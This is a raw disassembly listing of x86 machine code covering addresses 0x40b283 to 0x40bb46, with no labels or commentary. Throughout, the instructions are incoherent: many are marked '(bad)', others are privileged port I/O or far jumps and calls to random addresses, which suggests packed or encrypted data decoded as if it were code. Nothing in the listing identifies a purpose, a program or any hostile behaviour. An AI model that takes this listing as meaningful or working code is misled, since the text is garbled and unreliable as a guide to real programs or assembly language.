  40b283:	add    BYTE PTR [edi],ah
  40b285:	mov    eax,0xeff05532
  40b28a:	idiv   DWORD PTR [edi+0x74ecf804]
  40b290:	js     0x40b28b
  40b292:	add    ch,BYTE PTR [eax-0x15]
  40b295:	les    eax,FWORD PTR [ecx+0x0]
  40b298:	mov    edi,0xf0553687
  40b29d:	out    dx,eax
  40b29e:	jg     0x40b297
  40b2a0:	icebp  
  40b2a1:	loop   0x40b2d8
  40b2a3:	inc    ebp
  40b2a5:	pop    edi
  40b2a6:	in     eax,dx
  40b2a7:	je     0x40b2a9
	...
  40b2b9:	add    BYTE PTR [edi+eax*4],bh
  40b2bc:	jmp    0x54b4f246
  40b2c1:	mov    esp,DWORD PTR [eax]
  40b2c3:	cmp    bl,bh
  40b2c5:	jg     0x40b2b1
  40b2c7:	adc    al,0x77
  40b2c9:	add    ebp,DWORD PTR [esi]
  40b2cb:	icebp  
  40b2cc:	dec    esi
  40b2cd:	inc    edx
  40b2ce:	jmp    0x40b2f1
  40b2d0:	js     0x40b2d7
  40b2d2:	jo     0x40b2dd
  40b2d4:	add    al,0x75
  40b2d6:	push   ds
  40b2d7:	and    al,0x77
  40b2d9:	adc    BYTE PTR [eax+0x808771c],ah
  40b2df:	sub    al,0xee
  40b2e1:	(bad)  
  40b2e2:	test   DWORD PTR ds:0xe4733111,0xe3f5d91d
  40b2ec:	fwait
  40b2ed:	adc    ebx,edi
  40b2ef:	pop    edx
  40b2f0:	sbb    ebp,ebp
  40b2f2:	pop    esp
  40b2f3:	movups XMMWORD PTR [edx-0x10021b33],xmm6
  40b2fa:	add    al,bh
  40b2fc:	das    
  40b2fd:	in     eax,dx
  40b2fe:	mov    esi,0x85f1ede4
  40b303:	pop    ds
  40b304:	out    dx,al
  40b305:	cld    
  40b306:	je     0x40b377
  40b308:	fsubp  st(4),st
  40b30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b30b:	in     al,0x5b
  40b30d:	clc    
  40b30e:	xchg   edi,eax
  40b30f:	push   cs
  40b310:	push   0xffffffec
  40b312:	xchg   esi,eax
  40b313:	in     al,0x3b
  40b315:	hlt    
  40b316:	xchg   edi,eax
  40b317:	push   es
  40b318:	push   0xffffffec
  40b31a:	xchg   ah,ah
  40b31c:	cmp    ebp,esp
	...
  40b32e:	add    BYTE PTR [eax],al
  40b330:	xchg   edi,eax
  40b331:	fisubr WORD PTR [edx-0x14]
  40b334:	jbe    0x40b31a
  40b336:	sbb    esi,eax
  40b338:	push   edi
  40b339:	(bad)  
  40b33a:	push   0xffffffec
  40b33c:	data16 in al,0x1b
  40b33f:	adc    al,0x5f
  40b341:	pop    edx
  40b342:	fucomp st(4)
  40b344:	fmul   QWORD PTR [esi]
  40b346:	xchg   ecx,eax
  40b347:	jno    0x40b397
  40b349:	in     al,0x7d
  40b34b:	dec    esp
  40b34c:	cmp    ecx,ecx
  40b34e:	in     al,0x3
  40b350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b351:	(bad)  
  40b352:	jl     0x40b2d4
  40b354:	xor    ebp,edi
  40b356:	gs jbe 0x40b35d
  40b359:	in     al,0xd3
  40b35b:	adc    ebx,DWORD PTR [eax]
  40b35d:	outs   dx,BYTE PTR ds:[esi]
  40b35e:	mov    esp,0x290ff003
  40b363:	ja     0x40b324
  40b365:	jo     0x40b350
  40b367:	pop    ebx
  40b368:	jnp    0x40b38e
  40b36a:	test   al,0x3
  40b36c:	pop    es
  40b36d:	pop    edx
  40b36e:	add    cl,bl
  40b370:	or     al,0x5b
  40b372:	or     al,0x41
  40b374:	xor    al,0x8b
  40b376:	(bad)  
  40b377:	es call 0x43e92720
  40b37d:	aaa    
  40b37e:	call   0xff26131f
  40b383:	loop   0x40b338
  40b385:	push   edi
  40b386:	xor    DWORD PTR [eax+0x36],esi
  40b389:	out    dx,eax
  40b38a:	imul   esp,ebx,0xf685f2ab
  40b390:	retf   
  40b391:	adc    al,al
  40b393:	jne    0x40b395
	...
  40b3a5:	add    al,ch
  40b3a7:	jecxz  0x40b41d
  40b3a9:	add    DWORD PTR [edi+ebp*8-0x7d],eax
  40b3ad:	addr16 fwait
  40b3af:	in     al,0x4f
  40b3b1:	(bad)  
  40b3b2:	and    edi,ebp
  40b3b4:	dec    edi
  40b3b5:	into   
  40b3b6:	and    DWORD PTR [edi],ecx
  40b3b8:	call   0xff254dcf
  40b3bd:	rcr    DWORD PTR [ebx],1
  40b3bf:	mov    esi,edi
  40b3c1:	mov    dh,0x8b
  40b3c3:	pop    edx
  40b3c4:	call   0xfec9b78a
  40b3c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ca:	dec    esp
  40b3cb:	push   ebp
  40b3cc:	sbb    BYTE PTR [esi-0x1eff94a5],0xf3
  40b3d3:	push   es
  40b3d4:	call   0xff2521e7
  40b3d9:	jo     0x40b38c
  40b3db:	fimul  WORD PTR [esp-0x300aca8]
  40b3e2:	jecxz  0x40b3c7
  40b3e4:	je     0x40b3c3
  40b3e6:	sbb    ebx,DWORD PTR [ecx+0xff3e953]
  40b3ec:	rcl    ah,0xa3
  40b3ef:	retf   
  40b3f0:	inc    esp
  40b3f1:	pop    ecx
  40b3f2:	hlt    
  40b3f3:	push   es
  40b3f4:	add    cl,ch
  40b3f6:	xor    cl,BYTE PTR [edx-0xc]
  40b3f9:	add    BYTE PTR [esi+0x23000007],dh
  40b3ff:	pop    es
  40b400:	push   0x0
  40b402:	xor    eax,DWORD PTR [edi]
  40b404:	push   0x0
  40b406:	xchg   esp,eax
  40b407:	inc    ebp
  40b408:	hlt    
  40b409:	push   eax
	...
  40b41a:	add    BYTE PTR [eax],al
  40b41c:	push   ss
  40b41d:	pop    eax
  40b41e:	clc    
  40b41f:	(bad)  
  40b420:	jl     0x40b3f8
  40b422:	std    
  40b423:	jne    0x40b42a
  40b425:	ret    
  40b426:	mov    ss,WORD PTR [ecx+ecx*8+0x6]
  40b42a:	or     eax,eax
  40b42c:	dec    ebp
  40b42d:	or     al,0xeb
  40b42f:	cmp    ah,BYTE PTR [ecx-0x30]
  40b432:	es inc ecx
  40b434:	leave  
  40b435:	in     eax,dx
  40b436:	jae    0x40b448
  40b438:	icebp  
  40b439:	xchg   esp,eax
  40b43a:	cmp    edi,0xffffff96
  40b43d:	in     eax,dx
  40b43e:	jae    0x40b438
  40b440:	jmp    0xc6c6b407
  40b445:	in     eax,dx
  40b446:	xchg   DWORD PTR [ebp+0x55],eax
  40b449:	in     eax,dx
  40b44a:	jae    0x40b464
  40b44c:	mov    dh,0x57
  40b44e:	adc    al,0xff
  40b450:	mov    esp,0x9575fdbe
  40b455:	in     eax,dx
  40b456:	jae    0x40b460
  40b458:	mov    cl,0x13
  40b45a:	(bad)  
  40b45b:	call   DWORD PTR [esi-0x7e138c13]
  40b461:	mov    ebp,0xed86ff7f
  40b466:	inc    ebx
  40b467:	lock jb 0x40b3f7
  40b46a:	std    
  40b46b:	jne    0x40b4e2
  40b46d:	mov    esi,0x659543a
  40b472:	push   DWORD PTR [ebp-0x3f]
  40b475:	mov    ebp,0xecc681d8
  40b47a:	mov    edx,0x8b55062d
	...
  40b490:	add    BYTE PTR [eax],al
  40b492:	mov    ch,0x8a
  40b494:	ret    0xf0f4
  40b497:	cmp    edx,ebp
  40b499:	dec    BYTE PTR [edx+0xf245cef]
  40b49f:	mov    ds:0xa209e7fa,eax
  40b4a4:	jmp    0xe6f41ea7
  40b4a9:	(bad)  
  40b4aa:	in     eax,dx
  40b4ab:	xchg   ecx,eax
  40b4ac:	sub    DWORD PTR [ecx-0x10],eax
  40b4af:	out    dx,eax
  40b4b0:	add    al,BYTE PTR [eax]
  40b4b2:	lock jb 0x40b435
  40b4b5:	neg    dh
  40b4b7:	clc    
  40b4b8:	jmp    0x42cfd0c
  40b4bd:	add    al,dh
  40b4bf:	div    DWORD PTR [ebp+0x53]
  40b4c2:	lock out dx,eax
  40b4c4:	pop    edx
  40b4c5:	and    al,0x30
  40b4c7:	scas   eax,DWORD PTR es:[edi]
  40b4c8:	add    ch,BYTE PTR [eax-0x2c]
  40b4cb:	scas   eax,DWORD PTR es:[edi]
  40b4cc:	inc    ebx
  40b4cd:	add    BYTE PTR [eax],bl
  40b4cf:	add    al,BYTE PTR [ecx+eax*2-0x10]
  40b4d3:	shr    BYTE PTR [esi],0x6d
  40b4d6:	leave  
  40b4d7:	cs add al,0xff
  40b4da:	sbb    eax,0x8ea7dae8
  40b4df:	enter  0x67e8,0xcc
  40b4e3:	das    
  40b4e4:	inc    ebx
  40b4e5:	add    BYTE PTR [eax],cl
  40b4e7:	mov    esp,0x47f04142
  40b4ec:	xor    al,BYTE PTR [eax-0x4f]
  40b4ef:	out    dx,eax
  40b4f0:	pop    edx
  40b4f1:	add    dh,al
  40b4f3:	out    dx,eax
  40b4f4:	cmp    dh,0x0
	...
  40b507:	add    ch,ah
  40b509:	out    0xda,eax
  40b50b:	mov    edx,DWORD PTR [esi-0x70]
  40b50e:	call   0xeaa12a9f
  40b513:	inc    BYTE PTR [edi-0x1]
  40b516:	fist   DWORD PTR ds:0xff02efa3
  40b51c:	mov    ebp,0xf874e973
  40b521:	push   es
  40b522:	push   ecx
  40b523:	shl    DWORD PTR [ebp+0x31bb5de1],cl
  40b529:	or     ch,cl
  40b52b:	dec    esi
  40b52c:	imul   esi,edx,0x67
  40b52f:	rol    BYTE PTR [ebx],0xe0
  40b532:	inc    ebp
  40b533:	jmp    0x1f13bbd1
  40b538:	call   FWORD PTR [edx-0x1f]
  40b53b:	fild   DWORD PTR [ecx+0x78e92e60]
  40b541:	dec    edx
  40b542:	and    eax,0x9def0a5e
  40b547:	jle    0x40b527
  40b549:	loopne 0x40b52c
  40b54b:	ret    
  40b54c:	arpl   WORD PTR [ebx],bp
  40b54e:	sbb    DWORD PTR [edi],0x53e94630
  40b554:	fdivr  st,st(3)
  40b556:	arpl   cx,bp
  40b558:	mov    esi,0xe0038137
  40b55d:	out    dx,eax
  40b55e:	cs pop esp
  40b560:	sbb    BYTE PTR [edi+0x28],al
  40b563:	add    al,0x40
  40b565:	loopne 0x40b5ba
  40b567:	cld    
  40b568:	xchg   edi,eax
  40b569:	ret    
  40b56a:	mov    ebp,eax
	...
  40b57c:	add    BYTE PTR [eax],al
  40b57e:	xchg   esi,eax
  40b57f:	out    dx,eax
  40b580:	loopne 0x40b504
  40b582:	mov    fs,eax
  40b584:	lods   eax,DWORD PTR ds:[esi]
  40b585:	(bad)  
  40b586:	and    eax,0xf1042820
  40b58b:	push   es
  40b58c:	jmp    0xb5cb1a94
  40b591:	jmp    0x5c799604
  40b596:	in     al,dx
  40b597:	add    eax,0xa24803e9
  40b59c:	cmp    al,BYTE PTR [eax+esi*8]
  40b59f:	outs   dx,BYTE PTR ds:[esi]
  40b5a0:	lds    eax,FWORD PTR [ebx-0x4f]
  40b5a3:	push   es
  40b5a4:	adc    DWORD PTR [eax],ecx
  40b5a6:	mov    al,0x45
  40b5a8:	jmp    0x87bc08
  40b5ad:	sub    ah,ch
  40b5af:	fbstp  TBYTE PTR [esp+edi*8]
  40b5b2:	or     al,BYTE PTR [esi+0x0]
  40b5b5:	xchg   si,ax
  40b5b7:	push   cs
  40b5b8:	call   0xff21cc18
  40b5bd:	shl    edi,0x46
  40b5c0:	inc    ecx
  40b5c1:	jmp    0xa880b871
  40b5c6:	rep outs dx,BYTE PTR ds:[esi]
  40b5c8:	ss test eax,0xeb6806b2
  40b5ce:	repz push es
  40b5d0:	sub    BYTE PTR [esi],0x5e
  40b5d3:	psubsb mm7,QWORD PTR [edi]
  40b5d6:	into   
  40b5d7:	loopne 0x40b5d7
  40b5d9:	ins    BYTE PTR es:[edi],dx
  40b5da:	pop    esi
  40b5db:	fscale 
  40b5dd:	push   ss
  40b5de:	enter  0xe84f,0x89
	...
  40b5f2:	add    BYTE PTR [eax],al
  40b5f4:	and    eax,0x56060007
  40b5f9:	jecxz  0x40b5f9
  40b5fb:	je     0x40b5b8
  40b5fd:	out    0x1a,eax
  40b5ff:	ja     0x40b5c9
  40b601:	loopne 0x40b5cb
  40b603:	sub    ebp,DWORD PTR [edi-0x378dac21]
  40b609:	xchg   bl,al
  40b60b:	aad    0x96
  40b60d:	loopne 0x40b60d
  40b60f:	inc    ebx
  40b610:	in     al,dx
  40b611:	ins    BYTE PTR es:[edi],dx
  40b612:	es into 
  40b614:	add    DWORD PTR [edi],ecx
  40b616:	call   0xff20cfa0
  40b61b:	jo     0x40b64e
  40b61d:	jecxz  0x40b5e5
  40b61f:	in     al,dx
  40b620:	sub    eax,0xf3e94120
  40b625:	push   es
  40b626:	add    cl,ch
  40b628:	call   0x57e0acb7
  40b62d:	loopne 0x40b67e
  40b62f:	add    eax,esi
  40b631:	add    eax,0x192be900
  40b636:	push   edx
  40b637:	add    BYTE PTR [ecx+0x3],bl
  40b63a:	push   0x4a0983
  40b63f:	push   0x414340
  40b644:	icebp  
  40b645:	xor    BYTE PTR [eax+0x41],al
  40b648:	sbb    eax,ebp
  40b64a:	xor    ebp,DWORD PTR [ebp+0x0]
  40b64d:	dec    edx
  40b64e:	add    bh,bh
  40b650:	xor    al,0xdb
  40b652:	out    0x6b,al
  40b654:	mov    esp,0x68fde7
	...
  40b669:	add    BYTE PTR [edx+0x2100414a],bl
  40b66f:	jb     0x40b6b1
  40b671:	inc    ecx
  40b672:	or     DWORD PTR [ebx],edi
  40b674:	ss inc eax
  40b676:	cwde   
  40b677:	or     ch,BYTE PTR [eax+0x2]
  40b67a:	(bad)  [edx]
  40b67c:	cmp    bh,0x84
  40b67f:	loop   0x40b667
  40b681:	dec    edi
  40b682:	cld    
  40b683:	in     eax,0xfd
  40b685:	lea    edx,[esi+ebp*8-0x4]
  40b689:	(bad)  
  40b68a:	out    dx,al
  40b68b:	xor    ch,al
  40b68d:	fstp   DWORD PTR [eax+0xa]
  40b690:	add    bh,bh
  40b692:	xor    al,0xe6
  40b694:	std    
  40b695:	jne    0x40b628
  40b697:	ret    0x7d92
  40b69a:	mov    fs,ebp
  40b69c:	mov    edx,0x8b550a95
  40b6a2:	lods   eax,DWORD PTR ds:[esi]
  40b6a3:	add    edx,0xfffffff4
  40b6a6:	mov    edi,0x996afde5
  40b6ab:	inc    eax
  40b6ac:	daa    
  40b6ad:	inc    esp
  40b6af:	(bad)  
  40b6b1:	xor    eax,0x89fde5bc
  40b6b6:	adc    al,0xef
  40b6b8:	lds    eax,FWORD PTR ds:0x4125af
  40b6be:	dec    ecx
  40b6bf:	or     al,BYTE PTR [eax]
  40b6c1:	add    al,dh
  40b6c3:	bound  eax,QWORD PTR [eax-0x1a72b10a]
  40b6c9:	dec    edi
  40b6ca:	fsubr  st,st(3)
  40b6cc:	add    eax,DWORD PTR [eax]
	...
  40b6de:	add    BYTE PTR [eax],al
  40b6e0:	lock ja 0x40b678
  40b6e3:	push   eax
  40b6e4:	lock out dx,eax
  40b6e6:	pop    edx
  40b6e7:	popf   
  40b6e8:	mov    al,0x2e
  40b6ea:	add    al,0x68
  40b6ec:	jg     0x40b69e
  40b6ee:	inc    ebx
  40b6ef:	add    BYTE PTR [eax-0xfbebc0b],cl
  40b6f5:	xor    al,0x30
  40b6f7:	ins    DWORD PTR es:[edi],dx
  40b6f8:	fldcw  WORD PTR [esi-0x288200fe]
  40b6fe:	(bad)  
  40b700:	cld    
  40b701:	sbb    al,0xe6
  40b703:	addr16 push ebp
  40b705:	mov    al,0x43
  40b707:	add    BYTE PTR [eax+0x35],bl
  40b70a:	inc    ebx
  40b70b:	inc    ecx
  40b70c:	lock ja 0x40b73b
  40b70f:	inc    eax
  40b710:	xor    eax,esi
  40b712:	pop    edx
  40b713:	add    dh,al
  40b715:	out    dx,eax
  40b716:	cmp    dh,0x45
  40b719:	call   0x5057ef8
  40b71e:	out    0x8c,al
  40b720:	jne    0x40b6f6
  40b722:	jecxz  0x40b722
  40b724:	mov    bh,0x7f
  40b726:	ficom  DWORD PTR [ecx+0x41]
  40b729:	lock add bh,bh
  40b72c:	sbb    eax,0xe874e4e4
  40b731:	mov    bh,0xf6
  40b733:	jl     0x40b6cc
  40b735:	mov    ah,0xba
  40b737:	shl    esp,0xef
  40b73a:	dec    ebp
  40b73b:	mov    edx,DWORD PTR [esi+ebp*2-0x63810c40]
  40b742:	in     al,0x69
	...
  40b754:	add    BYTE PTR [eax],al
  40b756:	lock dec ecx
  40b758:	sbb    al,0xff
  40b75a:	in     eax,0xe7
  40b75c:	fisubr DWORD PTR [ebp-0x1a59f91c]
  40b762:	push   0xecbd9d43
  40b767:	cmp    al,0xd6
  40b769:	inc    edx
  40b76a:	lock push es
  40b76c:	jmp    0x6bcca774
  40b771:	in     eax,dx
  40b772:	cmp    eax,0xc8547ddd
  40b777:	add    ch,al
  40b779:	add    esi,eax
  40b77b:	out    dx,al
  40b77c:	rcl    BYTE PTR [edx-0x10],0x6
  40b780:	shr    DWORD PTR [esi+0x5be947df],1
  40b786:	inc    ebp
  40b787:	inc    esi
  40b788:	test   al,0x3
  40b78a:	cwde   
  40b78b:	adc    al,0xa9
  40b78d:	inc    edx
  40b78e:	lock (bad) 
  40b791:	push   esi
  40b792:	leave  
  40b793:	inc    edi
  40b794:	jmp    0x414f347d
  40b799:	inc    edi
  40b79a:	in     al,dx
  40b79b:	fsubr  QWORD PTR ds:0xa8479d5c
  40b7a1:	add    ecx,DWORD PTR [eax-0x56]
  40b7a4:	test   al,0x42
  40b7a6:	lock outs dx,BYTE PTR ds:[esi]
  40b7a8:	fild   WORD PTR [ebx+0x31]
  40b7ab:	pop    es
  40b7ac:	add    DWORD PTR [ecx],0xe56906f0
  40b7b2:	inc    esp
  40b7b3:	movups XMMWORD PTR [ebx-0x4c],xmm0
  40b7b7:	fdivr  st(5),st
  40b7b9:	jbe    0x40b7bb
	...
  40b7cb:	add    BYTE PTR [esp+edx*8-0x12],dh
  40b7cf:	in     al,0xa6
  40b7d1:	aaa    
  40b7d2:	sar    DWORD PTR [eax-0x1b16f8d1],1
  40b7d8:	sbb    al,0xdb
  40b7da:	aad    0x6e
  40b7dc:	clc    
  40b7dd:	out    dx,al
  40b7de:	addr16 xchg sp,bx
  40b7e2:	scas   eax,DWORD PTR es:[edi]
  40b7e3:	shl    ebx,0x6
  40b7e6:	adc    al,0x79
  40b7e8:	mov    ecx,DWORD PTR [eax+0x6e57acff]
  40b7ee:	add    BYTE PTR [ebx+0xb],al
  40b7f1:	fdiv   QWORD PTR [ecx+esi*8+0x3b]
  40b7f5:	cs jl  0x40b796
  40b7f8:	dec    esp
  40b7f9:	pop    DWORD PTR [ebp+edx*4-0x57]
  40b7fd:	push   es
  40b7fe:	push   0x45b3b3
  40b803:	adc    DWORD PTR [esp+ebx*1+0x41],edi
  40b807:	jmp    0xc0adcb58
  40b80c:	mov    dl,0x6
  40b80e:	call   0xff1e2a8c
  40b813:	repnz xor ebx,DWORD PTR [eax+0x19]
  40b817:	mov    ecx,0x460006bb
  40b81c:	push   ebp
  40b81d:	fs jmp 0x8e46:0x5006b2a9
  40b825:	push   cs
  40b826:	call   0xff1e0899
  40b82b:	inc    ecx
  40b82c:	cwde   
  40b82d:	pop    ecx
  40b82e:	jmp    FWORD PTR [esi]
	...
  40b840:	add    BYTE PTR [eax],al
  40b842:	dec    ecx
  40b843:	pop    es
  40b844:	push   0x463308
  40b849:	xchg   ecx,eax
  40b84a:	fwait
  40b84b:	sbb    eax,DWORD PTR [ecx-0x17]
  40b84e:	aam    0x12
  40b850:	ins    DWORD PTR es:[edi],dx
  40b851:	shl    BYTE PTR [edx],0x7
  40b854:	call   0xff1d2a9e
  40b859:	repnz mov bl,0x57
  40b85c:	sbb    DWORD PTR [ecx-0x1fff8b5],ebx
  40b862:	dec    esp
  40b863:	arpl   dx,bp
  40b865:	sub    DWORD PTR ds:0x39de5007,esi
  40b86b:	psubsb mm6,QWORD PTR [edx]
  40b86e:	push   edi
  40b86f:	fdiv   st(6),st
  40b871:	sar    DWORD PTR [ebx+0x59],0xff
  40b875:	add    BYTE PTR [esi+0x36fc73e7],dh
  40b87b:	cmp    eax,0x3ba3e808
  40b880:	(bad)  
  40b881:	call   DWORD PTR [eax+0x1c0002c4]
  40b887:	mov    edx,gs
  40b889:	or     DWORD PTR [ebp-0xca8ab1a],0x2
  40b890:	push   0x2a
  40b892:	jbe    0x40b8d1
  40b894:	or     al,ch
  40b896:	aad    0x3b
  40b898:	(bad)  
  40b899:	inc    eax
  40b89b:	dec    ebp
  40b89c:	cld    
  40b89d:	push   0x19
  40b89f:	out    dx,eax
  40b8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8a1:	adc    BYTE PTR [esi+0xc009e7],0x0
	...
  40b8b8:	cmp    eax,0x9684eda
  40b8bd:	pop    es
  40b8be:	out    dx,eax
  40b8bf:	mov    esi,0x413ec031
  40b8c4:	sbb    DWORD PTR [edi],edx
  40b8c6:	push   DWORD PTR [ebp+0x1]
  40b8c9:	out    dx,eax
  40b8ca:	bt     DWORD PTR [esi-0x58c21919],esi
  40b8d1:	in     eax,0xfd
  40b8d3:	mov    ebx,esp
  40b8d5:	nop
  40b8d6:	es inc ecx
  40b8d8:	leave  
  40b8d9:	mov    DWORD PTR [ebx],edi
  40b8db:	mov    al,cl
  40b8dd:	inc    ebx
  40b8de:	add    BYTE PTR [eax+0x457406a6],al
  40b8e4:	jno    0x40b8e8
  40b8e6:	inc    ecx
  40b8e7:	inc    ecx
  40b8e8:	leave  
  40b8e9:	sbb    eax,0x659bde8
  40b8ee:	add    BYTE PTR [ebx],cl
  40b8f0:	fnstcw WORD PTR [esi]
  40b8f2:	pop    ds
  40b8f3:	push   esi
  40b8f4:	icebp  
  40b8f5:	loop   0x40b87c
  40b8f7:	call   DWORD PTR [esi-0x76ff97ea]
  40b8fd:	aad    0xbc
  40b8ff:	push   0x4142b8f0
  40b904:	lock pop ds
  40b906:	jecxz  0x40b97c
  40b908:	call   0x77e26dc4
  40b90d:	cdq    
  40b90e:	jmp    0xf1ea:0xe190edfd
  40b915:	and    DWORD PTR [ebp+edi*1+0x45ddfaf0],eax
	...
  40b92c:	add    BYTE PTR [eax],al
  40b92e:	push   esp
  40b92f:	mov    ebp,0x714fb8c2
  40b934:	loope  0x40b934
  40b936:	inc    edx
  40b937:	sbb    bl,BYTE PTR [ebx]
  40b939:	pop    es
  40b93a:	lds    eax,FWORD PTR [edx+eiz*8+0x74]
  40b93e:	xor    al,0x59
  40b940:	pop    eax
  40b941:	or     BYTE PTR [eax],bl
  40b943:	neg    BYTE PTR [esi-0x1]
  40b946:	daa    
  40b947:	or     DWORD PTR [edx-0x37],eax
  40b94a:	xor    ch,ah
  40b94c:	add    dl,BYTE PTR [ebp+0x6b]
  40b94f:	dec    esp
  40b950:	xchg   bl,al
  40b952:	or     al,0x9a
  40b954:	cmp    DWORD PTR [edx-0x10],ebp
  40b957:	lds    ebp,FWORD PTR ds:0xead785ff
  40b95d:	stc    
  40b95e:	jp     0x40b978
  40b960:	loop   0x40b8ea
  40b962:	xor    eax,0x6e348e14
  40b967:	pop    es
  40b968:	inc    ebp
  40b969:	add    BYTE PTR [ebx-0x1e],ch
  40b96c:	mov    WORD PTR [edi],fs
  40b96e:	xor    eax,esi
  40b970:	cmp    BYTE PTR [esi],0xf0
  40b973:	jnp    0x40b9bc
  40b975:	push   0x43aedf
  40b97a:	daa    
  40b97b:	clc    
  40b97c:	and    DWORD PTR [eax-0x10],edx
  40b97f:	out    dx,eax
  40b980:	or     eax,0x38b124c0
  40b985:	call   0xff231a9c
  40b98a:	inc    eax
  40b98b:	pop    es
  40b98c:	push   ecx
  40b98d:	add    al,0xf0
  40b98f:	jmp    0x412632
	...
  40b9a4:	stc    
  40b9a5:	inc    edi
  40b9a6:	sub    BYTE PTR [eax+eiz*1],al
  40b9a9:	ficom  DWORD PTR [ebx+0xc]
  40b9ac:	mov    BYTE PTR [edx],dh
  40b9ae:	mov    esp,ecx
  40b9b0:	jbe    0x40b9a0
  40b9b2:	push   0xc1d96f5f
  40b9b7:	add    ebp,DWORD PTR [esi-0x1afc117a]
  40b9bd:	fsubr  QWORD PTR [esi]
  40b9bf:	loopne 0x40b9e3
  40b9c1:	(bad)  
  40b9c2:	pop    edi
  40b9c3:	loope  0x40ba13
  40b9c5:	fst    DWORD PTR [ebp-0x19e16a2a]
  40b9cb:	push   esi
  40b9cc:	jnp    0x40b9a7
  40b9ce:	sti    
  40b9cf:	fbstp  TBYTE PTR [esi]
  40b9d1:	push   ebx
  40b9d2:	icebp  
  40b9d3:	jmp    0x40ba20
  40b9d5:	pop    esp
  40b9d6:	jbe    0x40b9b9
  40b9d8:	(bad)  
  40b9d9:	cmp    BYTE PTR [eax-0x43f90c3a],ah
  40b9df:	mov    WORD PTR [ebx],cs
  40b9e1:	test   DWORD PTR [eax+eiz*8],esp
  40b9e4:	cdq    
  40b9e5:	push   es
  40b9e6:	ret    
  40b9e7:	das    
  40b9e8:	pop    es
  40b9e9:	push   ebx
  40b9ea:	loope  0x40b9d7
  40b9ec:	jge    0x40ba4a
  40b9ee:	inc    esi
  40b9ef:	loope  0x40ba59
  40b9f1:	inc    ebx
  40b9f2:	cmp    eax,0xe96cf06e
  40b9f7:	imul   ecx,DWORD PTR [edi],0x46
  40b9fa:	test   al,0x3
  40b9fc:	dec    eax
  40b9fd:	pop    es
  40b9fe:	jmp    0xb1302a06
  40ba03:	or     esi,0xffffffd8
  40ba06:	loope  0x40b9cb
	...
  40ba18:	add    BYTE PTR [eax],al
  40ba1a:	inc    ebx
  40ba1b:	clc    
  40ba1c:	mov    eax,0x581ceeb
  40ba21:	loope  0x40ba4a
  40ba23:	outs   dx,DWORD PTR ds:[esi]
  40ba24:	jmp    0xffda592c
  40ba29:	xor    cl,0x45
  40ba2c:	inc    ecx
  40ba2d:	jmp    0xf1b59215
  40ba32:	mov    esp,edi
  40ba34:	mov    al,ds:0xce090de
  40ba39:	push   esp
  40ba3a:	xchg   ecx,eax
  40ba3b:	fsin   
  40ba3d:	push   esp
  40ba3e:	nop
  40ba3f:	fnstenv [ecx+esi*8-0x75]
  40ba43:	pop    eax
  40ba44:	jp     0x40ba04
  40ba46:	push   eax
  40ba47:	iret   
  40ba48:	shr    ebp,0xf3
  40ba4b:	xor    DWORD PTR [ebx-0x43b8b43],ecx
  40ba51:	adc    ebp,esp
  40ba53:	ins    BYTE PTR es:[edi],dx
  40ba54:	sub    eax,0xe80ea69e
  40ba59:	int    0xa5
  40ba5b:	xlat   BYTE PTR ds:[ebx]
  40ba5c:	(bad)  
  40ba5d:	pusha  
  40ba5e:	mov    dh,0xda
  40ba60:	addr16 jmp 0x11fea259
  40ba66:	xchg   ebp,eax
  40ba67:	inc    ebp
  40ba68:	inc    ecx
  40ba69:	jmp    0x28822209
  40ba6e:	hlt    
  40ba6f:	xlat   BYTE PTR ds:[ebx]
  40ba70:	je     0x40ba63
  40ba72:	or     ebp,esp
  40ba74:	mov    al,ds:0x74d9105e
  40ba79:	push   ebp
  40ba7a:	adc    BYTE PTR [ebx+0x8],dl
  40ba7d:	inc    ecx
	...
  40ba8e:	add    BYTE PTR [eax],al
  40ba90:	mov    dh,0x5c
  40ba92:	inc    DWORD PTR [esi+0x2a]
  40ba95:	mov    BYTE PTR [ebx],0xe9
  40ba98:	es mov ebx,gs
  40ba9b:	push   0xffffffaf
  40ba9d:	fld    TBYTE PTR [ecx-0x17]
  40baa0:	dec    ebp
  40baa1:	sub    edi,edi
  40baa3:	pushf  
  40baa4:	jmp    0x40ba94
  40baa6:	call   0x89198b4b
  40baab:	lods   al,BYTE PTR ds:[esi]
  40baac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baad:	pop    edi
  40baae:	add    cl,ch
  40bab0:	rcr    BYTE PTR [ecx+0x44730067],0x41
  40bab7:	add    BYTE PTR [ecx-0x66bec08a],al
  40babd:	out    0x73,al
  40babf:	or     cl,dh
  40bac1:	je     0x40ba62
  40bac3:	dec    DWORD PTR [esi-0x41ffff96]
  40bac9:	js     0x40bb31
  40bacb:	test   eax,ebx
  40bacd:	inc    ecx
  40bace:	add    BYTE PTR [eax+0x1e],ch
  40bad1:	inc    edx
  40bad2:	inc    ecx
  40bad3:	add    BYTE PTR [esi-0x2c17f7c3],ch
  40bad9:	mov    eax,ds:0x3d9efffd
  40bade:	cld    
  40badf:	jmp    DWORD PTR [ebx+ecx*1]
  40bae2:	call   0xfdf8cbda
  40bae7:	leave  
  40bae8:	fwait
  40bae9:	push   cs
  40baea:	add    BYTE PTR [ebp-0x2e],dl
  40baed:	(bad)  
  40baee:	add    esp,0x10538b6d
	...
  40bb04:	add    BYTE PTR [eax],al
  40bb06:	ret    0x68d4
  40bb09:	add    BYTE PTR [ebp+ecx*2+0x3d9e50fc],bl
  40bb10:	or     BYTE PTR [edx+0x9],ch
  40bb13:	mov    eax,0x148e1073
  40bb18:	sbb    al,0x85
  40bb1a:	fnstcw WORD PTR ds:0xb7448b27
  40bb20:	mov    gs,WORD PTR [edx+0x9]
  40bb23:	ins    DWORD PTR es:[edi],dx
  40bb24:	add    BYTE PTR [eax-0x52],ch
  40bb27:	add    eax,DWORD PTR [eax]
  40bb29:	add    BYTE PTR [esi],ch
  40bb2b:	xor    BYTE PTR [edx+ebp*2],cl
  40bb2e:	push   ds
  40bb2f:	mov    dh,0x70
  40bb31:	add    al,0xb3
  40bb33:	or     ch,BYTE PTR [edx+0x0]
  40bb36:	add    DWORD PTR [ebx+ecx*2-0x1a52700],esp
  40bb3d:	jne    0x40bb2f
  40bb3f:	sti    
  40bb40:	jmp    0x40bba1
  40bb42:	cs loopne 0x40bb47
  40bb45:	leave  
  40bb46:	mov    dl,0xdc
